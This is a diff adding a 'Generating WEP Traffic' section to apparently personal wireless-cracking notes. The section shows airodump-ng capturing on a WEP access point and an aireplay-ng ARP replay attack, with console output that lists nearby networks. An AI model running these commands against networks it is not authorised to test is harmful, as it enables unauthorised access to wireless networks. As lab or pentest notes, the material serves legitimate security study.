@@ -137,6 +137,33 @@ Crack WPA2
 
       EAPOL HMAC     : E7 2C 3E D2 EC F6 5E 1B E0 6C 68 B5 92 74 6C 0C
 ```
+#### Generating WEP Traffic
+
+```bash
+root@vipertooth:~# airodump-ng -c 2 -b 16:59:C0:95:DB:06 wlan0mon
+Notice: Channel range already given
+
+ CH  2 ][ Elapsed: 6 mins ][ 2020-03-17 11:56 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 16:59:C0:95:DB:06  -15   0      376       24    0   1  195   WEP  WEP         wep            
+ 14:59:C0:95:DB:05  -15   0      378       86    0   1  195   WPA2 CCMP   PSK  NETGEAR73                
+ 30:09:F9:D2:41:FB  -30   3        2        0    0   1   65   WPA  CCMP   PSK  <length:  0>             
+ 98:DA:C4:0A:1B:59  -39   0        2        0    0   2  195   WPA  CCMP   PSK  MorganWiFi               
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ (not associated)   E0:B9:4D:AA:31:DA  -40    0 - 1      0      219         T3HP4D                       
+ 16:59:C0:95:DB:06  AC:37:43:4C:82:F9  -16    1e- 1e     2      128         wep                
+
+root@vipertooth:~# aireplay-ng -b 16:59:C0:95:DB:06 --arpreplay wlan0mon
+No source MAC (-h) specified. Using the device MAC (9C:EF:D5:FC:8C:DD)
+13:11:50  Waiting for beacon frame (BSSID: 16:59:C0:95:DB:06) on channel 1
+Saving ARP requests in replay_arp-0317-131150.cap
+You should also start airodump-ng to capture replies.
+Read 1583 packets (got 456 ARP requests and 444 ACKs), sent 567 packets...(0 pps)
+```
 
 #### Cracking WEP
 
